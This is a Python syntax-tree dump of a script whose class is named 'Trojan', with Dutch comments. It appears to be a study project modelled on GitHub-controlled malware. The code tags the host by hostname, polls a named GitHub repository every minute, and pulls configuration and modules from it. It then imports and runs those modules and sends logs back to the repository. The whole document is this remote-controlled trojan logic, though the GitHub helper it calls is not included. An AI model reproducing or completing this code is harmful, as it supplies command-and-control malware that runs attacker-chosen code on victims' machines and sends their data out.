"Module(body=[ImportFrom(module='github', names=[alias(name='Github')], level=0), Import(names=[alias(name='socket')]), Import(names=[alias(name='datetime')]), Import(names=[alias(name='random')]), Import(names=[alias(name='os')]), Import(names=[alias(name='json')]), Import(names=[alias(name='time')]), ImportFrom(module='importlib', names=[alias(name='import_module')], level=0), ClassDef(name='Trojan', bases=[], keywords=[], body=[FunctionDef(name='__init__', args=arguments(posonlyargs=[], args=[arg(arg='self'), arg(arg='repo_url')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='repo_url', ctx=Store())], value=Name(id='repo_url', ctx=Load())), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='github_connectie', ctx=Store())], value=Call(func=Name(id='Github', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='repo_url', ctx=Load())], keywords=[])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='id', ctx=Store())], value=Constant(value='')), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='first_time', ctx=Store())], value=Constant(value=True))], decorator_list=[]), FunctionDef(name='run', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Expr(value=Constant(value='Deze functie zal de applicatie runnen ')), While(test=Constant(value=True), body=[If(test=Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='first_time', ctx=Load()), ops=[Eq()], comparators=[Constant(value=True)]), body=[Expr(value=Call(func=Attribute(value=Name(id='self', ctx=Load()), attr='generate_unique_id', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='self', ctx=Load()), attr='create_directory_in_logs', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='self', ctx=Load()), attr='run_modules', ctx=Load()), args=[], keywords=[])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='first_time', ctx=Store())], value=Constant(value=False)), Expr(value=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='github_connectie', ctx=Load()), attr='send_logs_to_github', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='id', ctx=Load())], keywords=[]))], orelse=[If(test=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='github_connectie', ctx=Load()), attr='check_remote_repo', ctx=Load()), args=[], keywords=[]), body=[Expr(value=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='github_connectie', ctx=Load()), attr='load_modules', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='github_connectie', ctx=Load()), attr='get_config', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='self', ctx=Load()), attr='run_modules', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='github_connectie', ctx=Load()), attr='send_logs_to_github', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='id', ctx=Load())], keywords=[]))], orelse=[])]), Expr(value=Call(func=Attribute(value=Name(id='time', ctx=Load()), attr='sleep', ctx=Load()), args=[Constant(value=60)], keywords=[]))], orelse=[])], decorator_list=[]), FunctionDef(name='run_modules', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Expr(value=Constant(value='Deze functie zal alle modules inladen van de config en ze ook runnen ')), Assign(targets=[Name(id='config_path', ctx=Store())], value=Constant(value='config/config.txt')), With(items=[withitem(context_expr=Call(func=Name(id='open', ctx=Load()), args=[Name(id='config_path', ctx=Load()), Constant(value='r')], keywords=[]), optional_vars=Name(id='config_file', ctx=Store()))], body=[Assign(targets=[Name(id='config', ctx=Store())], value=Call(func=Attribute(value=Name(id='json', ctx=Load()), attr='load', ctx=Load()), args=[Name(id='config_file', ctx=Load())], keywords=[])), For(target=Name(id='module_data', ctx=Store()), iter=Name(id='config', ctx=Load()), body=[Assign(targets=[Name(id='module_name', ctx=Store())], value=Subscript(value=Name(id='module_data', ctx=Load()), slice=Constant(value='module_name'), ctx=Load())), Assign(targets=[Name(id='class_name', ctx=Store())], value=Subscript(value=Name(id='module_data', ctx=Load()), slice=Constant(value='class_name'), ctx=Load())), Assign(targets=[Name(id='module_path', ctx=Store())], value=JoinedStr(values=[Constant(value='modules.'), FormattedValue(value=Name(id='module_name', ctx=Load()), conversion=-1)])), Assign(targets=[Name(id='module', ctx=Store())], value=Call(func=Name(id='import_module', ctx=Load()), args=[Name(id='module_path', ctx=Load())], keywords=[])), Assign(targets=[Name(id='my_class', ctx=Store())], value=Call(func=Call(func=Name(id='getattr', ctx=Load()), args=[Name(id='module', ctx=Load()), Name(id='class_name', ctx=Load())], keywords=[]), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='my_class', ctx=Load()), attr='log', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='id', ctx=Load())], keywords=[]))], orelse=[])])], decorator_list=[]), FunctionDef(name='generate_unique_id', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Expr(value=Constant(value='Deze functie zal unique id maken op basis van de hostname + datum + een random nummer')), Assign(targets=[Name(id='hostname', ctx=Store())], value=Call(func=Attribute(value=Name(id='socket', ctx=Load()), attr='gethostname', ctx=Load()), args=[], keywords=[])), Assign(targets=[Name(id='current_day', ctx=Store())], value=Call(func=Attribute(value=Call(func=Attribute(value=Attribute(value=Name(id='datetime', ctx=Load()), attr='date', ctx=Load()), attr='today', ctx=Load()), args=[], keywords=[]), attr='strftime', ctx=Load()), args=[Constant(value='%Y%m%d')], keywords=[])), Assign(targets=[Name(id='number', ctx=Store())], value=Call(func=Name(id='int', ctx=Load()), args=[Call(func=Attribute(value=Name(id='random', ctx=Load()), attr='uniform', ctx=Load()), args=[Constant(value=1), Constant(value=2000)], keywords=[])], keywords=[])), Assign(targets=[Name(id='unique_id', ctx=Store())], value=JoinedStr(values=[FormattedValue(value=Name(id='hostname', ctx=Load()), conversion=-1), Constant(value='_'), FormattedValue(value=Name(id='current_day', ctx=Load()), conversion=-1), Constant(value='_'), FormattedValue(value=Name(id='number', ctx=Load()), conversion=-1)])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='id', ctx=Store())], value=Name(id='unique_id', ctx=Load()))], decorator_list=[]), FunctionDef(name='create_directory_in_logs', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Expr(value=Constant(value='Deze functie zal een map aanmaken in de map logs op basis van de hostname + datum ')), Assign(targets=[Name(id='logs_directory', ctx=Store())], value=Constant(value='logs')), Assign(targets=[Name(id='new_directory_path', ctx=Store())], value=Call(func=Attribute(value=Attribute(value=Name(id='os', ctx=Load()), attr='path', ctx=Load()), attr='join', ctx=Load()), args=[Name(id='logs_directory', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='id', ctx=Load())], keywords=[])), If(test=UnaryOp(op=Not(), operand=Call(func=Attribute(value=Attribute(value=Name(id='os', ctx=Load()), attr='path', ctx=Load()), attr='exists', ctx=Load()), args=[Name(id='logs_directory', ctx=Load())], keywords=[])), body=[Return()], orelse=[]), If(test=Call(func=Attribute(value=Attribute(value=Name(id='os', ctx=Load()), attr='path', ctx=Load()), attr='exists', ctx=Load()), args=[Name(id='new_directory_path', ctx=Load())], keywords=[]), body=[Return()], orelse=[]), Expr(value=Call(func=Attribute(value=Name(id='os', ctx=Load()), attr='makedirs', ctx=Load()), args=[Name(id='new_directory_path', ctx=Load())], keywords=[]))], decorator_list=[])], decorator_list=[]), FunctionDef(name='main', args=arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='trojan', ctx=Store())], value=Call(func=Name(id='Trojan', ctx=Load()), args=[Constant(value='git@github.com:laurensDSM/test0.git')], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='trojan', ctx=Load()), attr='run', ctx=Load()), args=[], keywords=[]))], decorator_list=[]), If(test=Compare(left=Name(id='__name__', ctx=Load()), ops=[Eq()], comparators=[Constant(value='__main__')]), body=[Expr(value=Call(func=Name(id='main', ctx=Load()), args=[], keywords=[]))], orelse=[])], type_ignores=[])"